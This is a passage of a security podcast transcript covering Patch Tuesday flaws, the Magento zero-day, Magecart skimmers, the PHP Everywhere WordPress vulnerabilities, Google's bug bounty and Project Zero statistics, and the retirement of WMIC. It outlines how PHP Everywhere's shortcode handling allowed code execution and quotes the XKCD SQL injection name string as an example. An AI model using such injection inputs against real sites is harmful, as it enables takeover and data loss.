None of the security vulnerabilities are known to be actively exploited, though one of the flaws fixed is again what Microsoft calls a zero-day, inasmuch as it was publicly disclosed even though it wasn't yet exploited.  So, yeah.  Someone just said, hey, this.  And Microsoft said, oh, okay, we're going to fix that.  It's a privilege escalation bug in the Windows kernel.  So it's potentially important.  There were also a handful of remote code execution vulnerabilities, so always good to have those gone.  And also good that nobody had discovered them before they were all being patched.  One was in Microsoft's DNS  server.  That earned itself a CVSS of 8.8.  SharePoint's server also had an RCE rating of 8.8.  Windows Hyper-V had an RCE that scored 5.3.  And that HEVC Video Extensions had three of its own remote code execution vulnerabilities with CVSSes of 7.8.



And again, we talked about how this happens in something like a codec.  Those are difficult to secure.  They are very complicated interpreters which are interpreting compressed tokenized data.  And the inherent assumption being made by the people who are writing the decompressors is that what they're being given was written by an authentic compressor.  Very hard to catch the flaw in that thinking.



Azure Data Explorer contained a spoofing vulnerability, earning itself a CVSS of 8.1.  Outlook contained a security bypass vulnerability, 5.3, as did OneDrive for Android also.  Actually it was a little easier to exploit, so that got a 5.9.  .NET and Teams both had denial-of-service vulnerabilities, meaning you can crash them, with CVSSes of 7.5.



And the world is not yet done with Microsoft's Print Spooler, which saw four elevation-of-privilege flaws fixed, as well as one in the Win32k driver which got a CVSS of 7.8.  And that one, that Win32k elevation of privilege was tagged as being more likely to be exploited because last month a very similar vulnerability in the same place, the Win32k driver, did come under attack shortly after it was patched.



So again, the bad guys, as we've said, they look at what gets fixed.  They know there's a window between Microsoft's release of these, and everything we were just talking about with CISA says that in some cases that window's open for a long time.  Still, they know that there's an opportunity during which they're able to attack something just patched.  So patches are analyzed.  They are reverse engineered.  The problem fixed is found.  Then an exploit is designed, and somebody tries to take advantage of it.  So Microsoft is suggesting that this one is likely to be exploited quickly, too.  And again, though, these are not affecting most of us.  These little high-value vulnerabilities are going to be exploited only in targeted attacks.



I mentioned at the top that Patch Tuesday has evolved over the years to become an industry-wide event.  Besides Microsoft, security updates were also released last Tuesday by, in alphabetical order, Adobe - although, again, remember, we're going to get to the Sunday surprise, the Super Bowl Sunday surprise that Adobe dropped after they released all of their patches on Patch Tuesday.  Also Android; Cisco; Citrix; Intel; the various Linux distributions from Oracle, Red Hat, and SUSE; Mozilla's Firefox; SAP; Schneider Electric; and Siemens all said, hey, let's put our patches out on the same day.



And you've got to wonder how IT folks get anything done on these second Tuesdays and the days immediately following.  I imagine they actually don't.  They just probably - and this is why we've sort of established this as an industry-wide patch fest is they're able to say, you know, cancel lunch and not have any away meetings and things, and basically just do nothing but analyze and decide what's safe to do and get that done as quickly as possible because these days we know that the bad guys are going to jump on them immediately and try to take advantage of them.



LEO:  Hey, I wanted to ask you one thing.  You said, you used the term "release after free."  That's a common, you know, after buffer overflows.  Right?  



STEVE:  Yeah, use after free.



LEO:  Use after free.  That's using a section of memory that is no longer in use, basically, that's appointed, that's been released.



STEVE:  Correct.



LEO:  It's kind of like buffer overflow.



STEVE:  Yeah, so in a system that dynamically manages memory, the idea is that the system figures out when you no longer have any references to something.



LEO:  Right.  It's garbage collection.  It's garbage collection.



STEVE:  Exactly.  And so it releases that.  It should invalidate any pointers...



LEO:  Right.



STEVE:  ...to that memory.



LEO:  Yeah.



STEVE:  But in some cases, if code holds onto a pointer, the pointer's no longer valid, but it's still pointing somewhere.



LEO:  So that's my question.  Because there's different ways of doing garbage collection, of course.  Count by reference is very common.



STEVE:  Yup. 



LEO:  How would you still have that pointer?  It shouldn't be releasing the memory if you still have the pointer.  Is that an error in the garbage collection?  It must be; right?



STEVE:  Yes.  Yes.  Exactly.



LEO:  Okay.  Okay.



STEVE:  The so-called "automatic language" is too automatic.



LEO:  Yeah.



STEVE:  So it has worked in a fashion that has created the vulnerability.



LEO:  Got it.



STEVE:  And so when it's getting fixed, that's what they're fixing is that they just said, okay, we don't want to put memory management responsibility on the programmer.  Besides, it's dumb; right?  We can do a better job.  Well, programs have branches, and they've got iterations.



LEO:  Right.



STEVE:  And they've got, you know, and nothing keeps a program from making a copy of a pointer for some purpose that the code doesn't track it correctly.  So, I mean, the fact is it's very difficult to do a perfect job of automatically managing memory.  It's sort of the holy grail in some sense.



LEO:  It's still better than using malloc and remembering to free it and all of that, I would imagine.  Maybe not.  You're an old-school guy.  You really - you use and release your own memory.



STEVE:  I do.  And the thing to remember also is that when a process is running, the OS tags all the allocations as belonging to that process. 



LEO:  Right.



STEVE:  So when the process terminates, it's not that there's like memory leakage in a properly functioning system.  The operating system will also release all the memory that that process had allocated.  In fact, that's one of the advantages of the old-school Unix approach is by, you know, they would launch a process like every time you as a client connected to a server, you spawned a copy of that server for your use.  And it really didn't matter if there were memory leaks, you know, in some of the things the server did.  But as soon as you were disconnected, that process was terminated, as were all of the allocations that it had made.  So it was sort of a self-cleaning system.  Microsoft by comparison in their model, for example my IIS code running on Windows server, I've got no memory leaks, despite the fact that I'm doing a whole bunch of stuff all the time.  But it's sort of a badge of honor to have a server running for five years and having it consuming not a single...



LEO:  No memory, yeah.



STEVE:  No memory more.  Because what you would normally see is over time...



LEO:  It would dwindle slowly.



STEVE:  Exactly, slowly creeping upwards.  It's like, what, wait, what did I forget?  What am I not releasing?



LEO:  Right.



STEVE:  Because the server is never restarting.  It's just running without ever shutting down.



LEO:  Right.  And you know, C and C++ don't have built-in garbage collection.



STEVE:  Correct.



LEO:  What I did not know is that a lot of C++ tooling includes a third-party garbage collection library.  And I bet you that's where the errors are.  And then languages like Python, Perl, they all have built-in garbage collection as part of their...



STEVE:  Yes, and it's those things that are being done for you, I mean, the programmer's not even capable of being aware, right, because it's just like, oh, it's built-in.  



LEO:  You don't have to care about it, yeah.



STEVE:  Yeah.



LEO:  So you're an advocate for manual allocation and deallocation of memory.  I guess you know if you wrote the program.  Problem is you get these big teams now.  It's easy for you.  You wrote the program.  You know everything the program does.



STEVE:  Yes.  Yes.



LEO:  But you get a thousand people working on an operating system, you can't count on them to know.



STEVE:  Yes.  And also the things I do are not massive.



LEO:  Right.



STEVE:  Like probably the biggest thing I've done is the DNS Spoofability system because it's got all kinds of stuff going on.  I mean, it's sending out queries, pseudo DNS queries.  It's having to send queries to each of the DNS servers that respond to, I mean, it's massively multitasking.



LEO:  Yeah.



STEVE:  But InControl, that I wrote last week, it's like, yeah, you know, it's 80...



LEO:  You know.  You know what's going on.



STEVE:  Yeah, 82K.  And it's just like, you know...



LEO:  You can actually browse the source code if you're worried and look for a malloc statement.  Or you don't have malloc.



STEVE:  Well, I can use the whole...



LEO:  How do you allocate memory in a - yeah, yeah, it's all in your mind.



STEVE:  It's just the entire thing is in my head at once.



LEO:  That's amazing.  How do you - so memory allocation in assembler.  Does it call a BIOS routine?  Or you just actually say I'm going to use this area to this area?



STEVE:  So that's the other thing is that coding a Windows app in assembler is basically scripting the Windows API.



LEO:  Right, right.  You call the API, yeah.



STEVE:  Exactly.  And so there's alloc.



LEO:  That's right, okay.



STEVE:  And so I say, you know, I need a K.  So alloc a K, and I get back a pointer to the beginning of the allocation.  And it's, yes, I have to be careful not to do something outside of the allocation.  It's entirely my responsibility not to go further.  But there is an arena around the allocation.  And so when I attempt to free it, Windows will check to make sure that the end of it is still intact, that there was no overwrite at the end.  And, if so, it crashes spectacularly, and then I go figure out what it is that I did wrong.



LEO:  At least your crashes are spectacular, and they happen while you're around.



STEVE:  And in fact if you were ever - if you were a fly on the wall, you would sometimes hear me go "Boom."



LEO:  It's like an amateur chemist in his basement.  There's never any question if something crashes.



STEVE:  No.  It's like, wow, okay.  What hap- now let's go look at this.



LEO:  I'm writing to the screen buffer, and it's not looking good, yeah.



STEVE:  Kaboom.



LEO:  Kaboom.



STEVE:  Anyway, yeah.  Okay.  So speaking of kaboom, I would imagine that a bunch of people had their Super Bowl Sunday plans ruined, some because the buck stopped with them for the creation and release of an emergency five-alarm CVSS 9.8 patch of a zero-day remote code execution bug in the Magento 2 / Adobe eCommerce platforms, which was being actively exploited in the wild.  And on the receiving end of the patch news, the screaming need was to immediately apply this patch that Adobe's engineers had pushed out on Super Bowl Sunday, like within hours all the warnings were, because it was that crucial to ecommerce sites that would have otherwise been compromised before half-time.



So to set the stage a bit, since we've never talked about the Magento ecommerce platform, it's open source and written in PHP.  It employs multiple other PHP frameworks such as the Laminas framework and Symfony.  The Magento source code is distributed under Open Software License (OSL) v3.0.  And after bouncing around and changing hands a few times, Magento was most recently acquired four years ago by Adobe, back in May of 2018, for a cool $1.68 billion.  Not a bad price for some volunteer-developed open source software that can be freely downloaded.  Wow.  Yeah.



And Magento's stats are impressive.  As of 2019, that's the most recent numbers I could find, more than 100,000 online stores had been created using the Magento platform.  The platform code has been downloaded more than 2.5 million times, unfortunately many of those by miscreants who are scouring the source code looking for ways in.



LEO:  I hate those miscreants.



STEVE:  Those miscreants.



LEO:  Miscreants.



STEVE:  And $155 billion worth of goods have been sold through Magento-based systems during just the year 2019 alone.  Magento accounts for approximately one third of all ecommerce happening on the web today.



Sansec, a firm which focuses upon ecommerce security, titled the event on Sunday, when they blogged about it yesterday, they titled it "Magento 2 critical vulnerability CVE-2022-24086."  And they explained:  "This Sunday, February 13th, Adobe released an emergency patch for a critical vulnerability in Magento 2.  It allows unauthenticated remote code execution..."



LEO:  Oh, wait a minute.  You've been writing Magneto.  But I'm looking at this quote.



STEVE:  Magento.  Oh, my.



LEO:  It's Magento.



STEVE:  Anyway, "It allows unauthenticated remote code execution," that is, this flaw, which of course is bad.  Or as the Sansec guy said, "the worst possible type."  They said:  "Actual abuse has already been reported.  Adobe" - now, here's the gotcha.  I mean, I don't understand this.  They wrote:  "Adobe has been aware of the issue since at least January 27th" - 2.5 weeks prior - "but decided to issue a patch on Super Bowl Sunday."  I said Super Bowl.  They didn't.  "Which," they said, "is highly unusual.  Sansec," they wrote, "expects that mass scanning and exploitation will happen within the next 72 hours."  I saw elsewhere people saying within a couple hours.



Under Implications in their posting, they wrote:  "This vulnerability has a similar severity as the Magento Shoplift vulnerability from 2015.  At that time, nearly all unpatched Magento stores globally were compromised in the days after the exploit's publication."  And remember, this is PHP.  It's a few lines of PHP.  So it's not going to take a high-end reverse engineering rocket scientist hacker to figure out what got patched.  And since the cat's already out of the bag, Sansec saw no need not to show the full patch in their announcement, which they did.  It's just a reg - I looked at it.  It's a regular expression, in a loop, string replacement, presumably to sanitize some dangerous user-controlled input to make it undangerous.



The patching advice itself is sort of interesting.  First of all, the trouble affects versions 2.3.7-p2 and earlier, and 2.4.3-p1 and earlier of both the Magento and Adobe ecommerce platforms.  They're the same thing essentially.  Apparently  Adobe paid $1.68 billion to put their name on it.  And according to Sansec, who clearly understand what's going on, Sansec said:  "Sites running Magento 2.3 or 2.4 should install the custom patch from Adobe ASAP, ideally within the next few hours."



LEO:  That's ASAP, all right.  



STEVE:  Yeah.



LEO:  Holy cow.



STEVE:  I mean, during the game, like stop, turn off the TV.  You've got, like, no time to get this in.  They said:  "Sites running a version of Magento 2 between 2.3.3 and 2.3.7 should be able to manually apply the patch, as it only concerns a few lines of PHP source."  And they said:  "And sites running Magento 2.3.3 or below are not vulnerable."  So this was introduced after 2.3, between 2.3.3 and 2.3.later.  "However, Sansec still recommends," they wrote, "manually implementing the given patch."  You know, and why not?  Just do what Adobe wants you to, although you could probably safely - oh.  Apparently I said this.  You could probably safely watch the big game first.



LEO:  On the measure now of how much of a crisis it is.  Oh, you can watch the game, go ahead.



STEVE:  Can I finish this episode?  Or do I have to just stop right now?  Do I have to hit pause, or can I just wait?  So online ecommerce sites and vulnerabilities of course are particularly high-value targets with credit card skimming being the primary goal.  That's what they're always doing.  These guys are installing skimmers which capture credit card credentials on the fly when people make their purchase.



The most active nefarious group in this space is known as the Magecart, M-A-G-E-C-A-R-T, Magecart group which specializes in targeting unpatched versions of Magento, by any other name, in particular, looking for a way to plant credit card skimmers on the checkout pages of ecommerce websites.  The Magecart group, which is actually a consortium of many different card-harvesting subgroups, consistently evolves its skimmers to be more effective and efficient at evasion.



And this has been going on for years.  I mean, as long as there's been ecommerce code, they've been at it.  For example, in November it added an extra browser process that uses the WebGL JavaScript API to check a user's machine to ensure it's not running on a virtual machine, which helps it to evade researcher detection.  And last month, in January, an attack on Segway, actually I saw that, and it almost made the podcast, but there wasn't anything like super standout about it.  An attack on Segway, you know, the people who make the rolling things, planted a skimmer by using a favicon that traditional security systems wouldn't inspect.  So these guys are sneaky.



Now, Adobe, who is working to downplay the apparent sudden severity of the issue after having sat on it for more than two weeks because that's when the CVSS was, I mean, the CVE was issued, they initially characterized the attacks as "very limited."  Okay.  Still, 9.8, not good.  And issue the update on a Sunday.  So on Super Bowl Sunday.  But card-skimmer activity is on the rise, and we know how long websites often take to update.  And for example, completely separate from this, last week Sansec reported a wave of skimming attacks targeting more than 500 sites, in particular those using outdated and unsupported Magento 1 implementations, which are old.  And data from Source Defense found as many as 100,000 ecommerce sites that are still using past-end-of-life Magento v1.  So, wow.  100,000 sites still using Magento 1.



Okay.  Now, while we're on the subject of things written in PHP, and I'm already on record about how I feel about that...



LEO:  By the way, it has garbage collection, I just want to point out.



STEVE:  Yes, it does.



LEO:  Yes, it does.



STEVE:  You don't need to worry about that.



LEO:  We'll take care of it.



STEVE:  We'll take care of that for you.  Yet another WordPress add-on, this one called PHP Everywhere.  And Leo, a better name has never been coined.  You know?  And PHP Everywhere really doesn't sound like a good idea.  It was responsible for placing more than 30,000 additional WordPress sites at risk of remote code execution.  And trivial remote code execution, you know, and that's the worst.



Now, the fact that Magento, which we were just talking about, which powers one third of the world's highly targeted ecommerce sites, was also written in PHP, demonstrates that it is definitely possible for sufficiently skilled developers to author secure website code in PHP.  I'm not saying it's not.  That's not the issue.  The issue is that PHP's deliberately and seductively easy-to-use design, which is what makes it so popular, encourages unskilled developers to place their code online.  You know, if you had to write it in C#, which has got lots of little pointy sharp bits on it, you know, you probably wouldn't; right?  So people don't.  They use PHP because, oh, look, I wrote a line, and it worked.  Ship it.



In fact, that pithy little slogan I coined a few weeks ago comes to mind:  "Most developers stop working the moment their code starts working."  We know that there's a big gap between code which works and code which is also secure against attack.  And due to the online website environment where PHP typically finds itself, that often leads to trouble.  I now have a bunch of stuff at GRC written by other people in PHP.  And the only way I was going to ever allow any of that near GRC's network was by putting all of it on its own physical server located behind a physical firewall, I mean, like with wires, that almost completely cuts it off completely from the rest of GRC's network.



I mean, I'm happy to have that stuff.  The forums are great.  And grc.sc, the little link shortener, there's something called "YOURLS" is a nice little bit of PHP I picked up from someone.  But it's all sequestered behind a firewall.  So if something gets loosed there, at least I have containment.



Okay.  So today we have PHP Everywhere.  Get a load of this.  I It's like meta bad.  The WordPress plugin, this PHP Everywhere, as it's named, has its name because it - I can hardly even say this - it deliberately allows site owners to execute PHP code anywhere on their site.  According to the add-on's description:  "This plugin enables PHP code everywhere in your WordPress installation.  Using this plugin you can use PHP in Pages and  Posts."  Wait, posts?  You can put PHP in posts?



LEO:  Oh, lord.  That's a terrible - what could possibly go wrong?



STEVE:  What could possibly go wrong?  And also in the Sidebar.



LEO:  Oh, yeah, just embed it, what the hell.



STEVE:  Yeah.  Its description says "everywhere."  And it goes on to boast.  It says:  "The plugin also supports different user restrictions and multiple PHP instances.  So feel free to just insert PHP in every part of your WordPress site."  It's unbelievable.  And then he says:  "Examples of use:  Create custom contact forms and process any kind of data or upload.  Generate user optimized content.  Customize every little detail of your WordPress installation."  And then we add, what could possibly go wrong?



That's right, create a handy-dandy WordPress add-on that encourages site operators who may barely be able to code to liberally litter PHP everywhere around their site.  And you, too, can earn not just one, but three of those oh-so-rare CVSS scores of 9.9, as this author did, accompanied by three of your very own CVEs:  CVE-2022-24663, 664, and 665, each with a CVSS score of 9.9.  As it turned out, PHP Everywhere's functionality, not surprisingly, allowed the execution of PHP code snippets through WordPress shortcodes.



Unfortunately, WordPress allows any authenticated users to execute shortcodes via the parse-media-shortcode AJAX action, and some plugins also allow unauthenticated shortcode execution.  As such, it was possible for any logged-in user, even a user with no permissions such as a Subscriber or a Customer, to execute their own arbitrary PHP on a site that had PHP Everywhere - after all, everywhere - by sending a request with the shortcode parameter set to open a block, so [php_everywhere] that invokes that add-on.  Then whatever PHP you want, and then you close the block with a [/php_everywhere].  And not surprisingly, executing arbitrary PHP on a site typically allows complete site takeover.



Now, we've been here before; right?  Allowing users to execute their own code is reminiscent of all the persistent problems we used to have with SQL injection.  That inspired this classic XKCD cartoon.  Four frames.  We've got the first frame.  Mom is listening on the phone.  She's picked up the phone, and she hears over the phone, "Hi.  This is your son's school.  We're having some computer trouble."  And Mom says, "Oh, dear.  Did he break something?"  And the school replies, "In a way," and then asks Mom, "Did you really name your son Robert '); DROP TABLE Students;--?"  And Mom says, "Oh, yes.  Little Bobby Tables, we call him."  And the school says, "Well, we've lost this year's student records.  I hope you're happy."  And Mom replies, "And I hope you've learned to sanitize your database inputs."  Because of course "drop table students" is a command that SQL could execute, and somebody typed it in as the student name, and blammo.



So this is a perfect case in point here.  This PHP Everywhere should obviously never have been allowed to happen.  But there's no oversight, and the deliberately created ecosystem surrounding WordPress encourages this sort of thing; right?  It's like, oh, we create add-ons for WordPress.  They're great.  And since none of my ranting is likely to change WordPress's approach one iota, I understand, my only hope and my purpose here is to adequately instill in our listeners a sober appreciation for the dangers inherent in using third-party add-ons with WordPress.



It's clear, as you've said, Leo, that the base WordPress system itself is mature, was professionally written, and is being professionally maintained, just like Magento.  It's secure and bulletproof.  But that security doesn't necessarily pertain in any way to anything that's added to it.  And so it's super critical that our listeners keep that in mind, that is, just because the base WordPress is solid doesn't mean some wacko can't create PHP Everywhere and, gee, isn't that convenient.  People can put PHP in their posts.  Oh, yeah.  Log4j, anyone?  Wow.



Okay.  Google's Vulnerability Reward Program for 2021.  Last Thursday, Google shared the results of their vulnerability responsible reporting reward program for the previous year, $8.7 million handed out to people responsibly reporting problems to Google.  There are a bunch of interesting facts and stats, and dollar amounts and bug counts, that I believe our listeners will be interested in.  So I'm going to share an edited-down version of what Google wrote.



They said:  "Last year was another record setter for our Vulnerability Reward Program."  Those are VRPs.  They said:  "Throughout 2021, we partnered with the security researcher community to identify and fix thousands of vulnerabilities, helping keep our users and the Internet safe.  Thanks to these incredible researchers, Vulnerability Reward Programs across Google continued to grow, and we're excited to report that in 2021 we awarded a record-breaking $8,700,000 in vulnerability rewards, with researchers donating over $300,000 of their rewards to charities of their choice.



"We also launched bughunters.google.com," and that's a URL I wanted to be sure to share with our listeners who might be interested last year, "bughunters.google.com, a public researcher portal dedicated to keeping Google products and the Internet safe and secure.  This new platform brings all of our VRPs - Google, Android, Abuse, Chrome, and Google Play - closer together and provides a single intake form, making security bug submission easier than ever.  We're excited about everything the new Bug Hunters portal has to offer."



Then they talk about some specifics.  For Android, "The Android VRP doubled its 2020 total payouts last year [2021] with nearly $3 million in rewards, and awarded the highest payout in Android VRP history, an exploit chain discovered in Android receiving a reward of $157,000.  Our industry-leading prize of $1.5 million for a compromise of our Titan-M Security chip used in our Pixel device remains unclaimed."  Of course that's good news.  They don't want to pay that out.  But they want to say, hey, if you find something wrong, how about 1.5 million bucks?  They said:  "For more information on this reward and Android exploit chain rewards, please visit our public rules page."



They said:  "The program also launched the Android Chipset Security Reward Program, a vulnerability reward program offered by Google in collaboration with manufacturers of certain popular Android chipsets.  This private, invite-only program provides reward and recognition for contributions of security researchers who invest their time and effort into helping make Android devices more secure. In 2021 the ACSRP paid out $296,000 for over 220 valid and unique security reports."  So not high payout individually, but probably easier to get.  So some lower hanging fruit.



They said:  "We'd also like to give a special shout-out to some of our top researchers whose continued hard work keeps Android safe and secure:  Aman Pandey of the Bugsmirror Team," they said, "has skyrocketed to our top researcher last year, submitting 232 vulnerabilities in 2021.  Since submitting their first report in 2019, Aman has reported over 280 valid vulnerabilities to the Android VRP" - and again, just 232 last year, so he's really accelerated his pace - "and has been a crucial part of making our program so successful."  He probably made himself some nice money, too.



"Yu-Cheng Lin has been another phenomenal researcher for the Android VRP, submitting a whopping 128 valid reports to the program last year.  Researcher" - and we just have a wacky Gmail email - "discovered a critical exploit chain in Android, receiving the highest payout in Android VRP history."  Oh, he's the guy who got the $157,000 for an exploit chain.



For Chrome they said:  "This year the Chrome VRP also set some new records.  115 VRP researchers were rewarded for 333 unique Chrome security bug reports submitted in 2021, totaling $3.3 million in VRP rewards.  The contributions did not only help us to improve Chrome, but also the web at large by bolstering the security of all browsers based on Chromium."  And they call out some other leading researchers, and that's pretty much it.  "So a huge thanks and congratulations to all Chrome VRP researchers that helped us make Chrome and Chrome OS more safe."



So $8.7 million last year.  You know, bug hunting, we've talked about it a lot, is not guaranteed income, but it might be an interesting way to spend some spare evenings when nothing else is going on.  The more you look and poke around, the more you'll learn.  And as I've said before, and every time it's happened for me it's been the case, there is really no better way to extend one's own coding skills than by reading and comprehending someone else's code.  You just, you look at it, and it's just, you know, it's almost like somebody else wrote it.  You learn things.  And you might have a well-earned payday.



LEO:  You also learn a lot about coding by looking at other people's code.  It's valuable.  Everybody's got a different way of doing things. 



STEVE:  Right, well, and when you think about it, how do writers learn to write?  They learn by reading.



LEO:  Exactly.  They read.  Yeah.



STEVE:  Yeah.



LEO:  It's challenging, at first.  Everybody has a different way of coding.



STEVE:  Yeah.  Oh, and finally, before we wrap, we have Google's Project Zero stats which I thought were also interesting.  Okay.  So this is of course their zero-day flaws which were found across the industry.  Their recently published data, the good news is, reveals that the average period software vendors used to repair and issue security updates reported by Project Zero last year was 52 days, which was a significant reduction  despite no reduction in bug levels  from 80 days three years ago.  So three years ago 80 days average to fix things.  Now we're down to 52.  And again, not like there were fewer problems.  And now nearly all vendors are addressing their flaws within what has become an accepted industry deadline of 90 days.  And then after that, just before lowering the boom, for some reason there's an agreed-upon grace period of two weeks.  I don't quite understand that, but okay.



The stats for the 2019-2021 period show a total of 376 zero-day reports from Project Zero with 26% concerning Microsoft, 23% Apple, and 16% Google.  The sum of those three is 65%.  So those three  Microsoft, Apple and Google  constitute essentially two thirds of all of the Project Zero reports.  And it's not surprising that the largest commercial desktop OS and the vendors of the two biggest mobile OS vendors or the providers of the two biggest mobile OSes would be those top three.



For anyone who's interested in a complete breakdown, I've got a chart in the show notes which breaks the stats down by vendor.  Oracle had the fewest Project Zero reported zero-days, I mean, and really remarkably few at only seven, seven in 2021; although they also took the longest to fix those seven, with four of them exceeding both the 90-day fix-by deadline and the additional two-week grace period.  So, you know, I guess that's one advantage of having lots of problems is you end up building a team that's, like, awake all the time.  Whereas Oracle's people probably, like, have to be brought back in from vacation in order to fix the problem.



And as the chart above shows, the three overall best patching performers by average days to fix, and impressively, were Linux at just 25 days, they're the minimum average days to fix a problem; Google at 44 days; and Mozilla at 46.  At the other end, the worst performing was Oracle, as I said, at 109 days.  But again, they only had seven problems compared to Apple, who had 84 zero-days.  So then we have Microsoft, who took an average of 83 days each; and Samsung, who was a bit quicker at 73.  And notably Microsoft also had the most fixes, 15 of them, which occurred within that final two-week grace period.  So Microsoft was blowing through their 90 days.  And just before Google was saying, uh, you know, we're going to tell everybody what's wrong here...



LEO:  That's how I do my homework.  I wait till the very end and then, yeah.



STEVE:  Exactly.  And comparing the mobile OS terrain, iOS and Android are about tied, with iOS having an average time-to-fix of 70 days and Android taking 72.  And on the web browser side, not surprisingly, since we often observe Google's quick response with Chrome, they beat everyone with an average time-to-fix of 29.9 days average, so like 30.  And on the other end is Apple's WebKit, the longest at 72.7 days on average.  At the same time, that was 40 bugs for Chrome and only 27 for WebKit.  



LEO:  Look at Firefox, only eight.



STEVE:  Yeah.



LEO:  Yeah.



STEVE:  Yeah, Firefox did a really nice job last year.  And again, as an industry overall, it seems clear that, despite the appearance of an increasing rate of problems  and it feels like an increase in problem severity since we're dragging an ever-growing legacy behind us still  those tasked with fixing problems, much as we might wish they were even better, they're managing to stay ahead, keeping things under control and reducing our overall exposure.



And you know, the one thing I was tempted to do was to multiply the number of days of an outstanding problem by the number of problems because that would kind of give you the, I don't know what you'd call it, not really the area under the curve.  But that's also sort of an interesting metric.  And like Apple, who took twice as long, had half as many problems.  So the problem exposure area was sort of the same.



So anyway, one last thing.  Bye-bye, WMIC.  And yes, K-E-Y-M-O-U-S-E.  Last week we talked about the practice of "Living Off the Land," where malware or, Leo, miscreants take advantage of commands and features available at the local system, where they find themselves.  One of the more often abused features of Windows, which we touched on last week, is the massively capable Windows Management Instrumentation (WMI) system, which is accessible through the command-line executable wmic.exe.



The fact that this useful command-line access tool is so often abused has not escaped Microsoft's attention.  As a result, wmic.exe is going away.  And if you know anything about Microsoft, it's that they really, really, really, really, really, really strongly really dislike ever removing anything from Windows, especially something like WMIC, a system management tool that almost certainly figures actively into the management scripts being used by their enterprise users, who they care about most, among others.



And despite this extreme reluctance, Microsoft is in the process of removing wmic.exe, starting with the latest Windows 11 preview builds in the Dev channel.  They did announce last year that this was their intention, and that they were in the process of deprecating the use of wmic.exe in Windows Server in favor of Windows PowerShell, which provides a full superset of WMIC's capabilities, including the ability to query the Windows Management Instrumentation system directly.



Microsoft wrote:  "The WMIC tool is deprecated in Windows 10, version 21H1, and the 21H1 General Availability Channel release of Windows Server.  This tool is superseded" - okay.  But whenever Microsoft supersedes something, they leave the other one alone; right?  Still there.  They said:  "This tool is superseded by Windows PowerShell for WMI.  This deprecation only applies to the command-line management tool.  WMI itself is not affected."



Okay.  So now Microsoft has been spotted removing WMIC from Windows clients, starting with Windows 11 preview builds in the Dev channel.  The guys at BleepingComputer did some sleuthing and confirmed that, from at least build 22523, the WMIC command is no longer available in Dev channel clients, although they noted that Microsoft may have removed it from earlier builds which they didn't check.



Microsoft may be testing the waters to see whether they're able to pull it from Windows, or to gauge how much fur will fly if they do.  They clearly want to, and you'll note that the only possible reason for deliberately yanking something from Windows that's already there and that many good people are using, is that many bad people are using it, too.



One thing that might happen, which wouldn't surprise me, would be for them to make it available separately as an optional manual download.  That's something they've done before. It's certainly the case that 99.999, and you can just keep on going with nines, percent of Windows client users have never typed the command "wmic," and never will.  So having it there, only to ever be used by malware, really makes no sense.  But leaving it as optionally available, though deprecated and not recommended, minimizes the damage from pulling it from existence entirely.  So it won't be present, but power users will be able to get it.  Or enterpriser users could selectively get it.



And you know, Leo, this makes me question Windows' future.  It is so loaded with that kind of thing that nobody who looks at the friendly candy-coated surface of Windows ever knows about.  But it's there, and it's being abused.  You kind of wonder whether there might at some point be like a power tools package that you could easily install, but where just generic Windows won't have it because only the bad guys are ever going to use it, never the person sitting in front of the keyboard.  In any event, for maximum compatibility, everyone should take this as a heads-up.  If you or your enterprise are currently dependent in any way upon wmic.exe, you'd be well advised to move over to PowerShell.



Back in 2016, everybody was upset over Microsoft pushing us to Windows 10, so I created Never10.  Pithy little name.  I liked it a lot.  Three million people have downloaded it.



LEO:  Are you kidding?



STEVE:  Three million.



LEO:  Holy cow.  Microsoft must hate you.



STEVE:  Yeah.  They're probably thinking, what's he going to do now?



LEO:  Oh, my god.  



STEVE:  Yeah.  And really they're upsetting people, right, by now what they're doing is upgrading your Windows without your knowledge, people complaining about it constantly. 



LEO:  Yeah.



STEVE:  And you look at Windows 11.  Well, you can't put the task bar on the side of the screen.  I've looked at it, Leo.  I had to have a laptop running 11 in order to get this latest piece of freeware done.  I mean, it is beautiful looking.  I have to say, I mean, it's gorgeous.  But I'm happy with Windows 10.  And yes, somebody's somewhere saying "When pigs fly, Steve is happy with Windows 10."  But it's true.



Anyway, so first I thought, okay, it really isn't Never11 because people are also not wanting their versions or their feature releases of 10 to change.  So people who are on 10 want, basically, people want to stay put.  And so that was like, oh, I'll call it StayPut.



So then as I started talking in the newsgroup with the gang who helped me over the past week to get this thing all polished and honed and working just the way we wanted, someone said, well, that's good, but it won't really work for me because I do want to move Windows 10 from 21H1 to 21H2.  So I'd like to do that.



Well, as I looked deeper into Microsoft support for group policies, I realized that the way they had implemented the controls, targeted at enterprise users, but available to everyone, was literally with a targeted release version in the registry.  So that allows a user of Windows to target Windows Update to a specific major version, like 10 or 11 or 12, and then the individual feature release within that major version, which of course is now what Microsoft is doing.  And if you target at the one you're on now, well, then, you get the advantage, you get the equivalent of staying put.  It will not go.



And in fact during my testing I had a machine - how did I run across this?  I can't remember now.  I had a machine with like 1504 or something, like from the dawn of Windows 10.  And I put InControl on it, and boy, was Windows Update unhappy.  I mean, it was like squirming around because it had gone out of support a long time ago.  But it would not update it.  So this lock is powerful.  But the advantage is it doesn't shut down Windows Update.  All your security updates, your monthly standard roll forward continue.  But it will keep you at where you are at the major version and the feature release, either where you are, if you just leave it set to its default, or if you wanted to say, yeah, I'm ready to go to Windows 11, you're literally, you can click the button to release control.



There's two fields in the lower left for Version and Release.  You could change the 10 to 11 and hit Take Control, and it would lock it, telling it wants Windows Update to take you to Windows 11 as soon as it will.  So anyway, it went from StayPut to UnderControl to TakeControl to InControl, which is where we are.  And as I said before, 82K of assembly language, just one of my little cute, you know, you don't have to set it up or install it or anything.  You just run it.  And the only thing I have left to finish is the documentation.  As I did for Never10, I want to fully document the six Registry keys.  There are six Registry keys that it manages.  And that's all it is.  It's simple.  But there are, as I said last week, there are sites that are telling people to disable Windows Update completely,



LEO:  No.  No.  Yeah, no.



STEVE:  I know.  It's like bad, bad, bad, bad, bad.  



LEO:  Unh-unh, yeah.



STEVE:  So this gives people some control that they wouldn't otherwise have in a very friendly user interface.



LEO:  Good.



STEVE:  So that's it.  And that's our podcast.



LEO:  And that's the show, ladies and gentlemen.  Every week he comes up with something.  Not always a program, but that's cool.  It just changes the Registry.  And I presume if it doesn't see that key, it doesn't screw with it or anything like that.  Doesn't create...



STEVE:  Correct.  And in fact, some people have a few of the things already set.



LEO:  Right.



STEVE:  And so the other thing, it'll come up and say, well, you are partially in control.



LEO:  Oh, that's...



STEVE:  And it will say you're missing three of the six Registry keys required to blah blah blah.



LEO:  That's great.



STEVE:  So, you know, it does the whole thing.



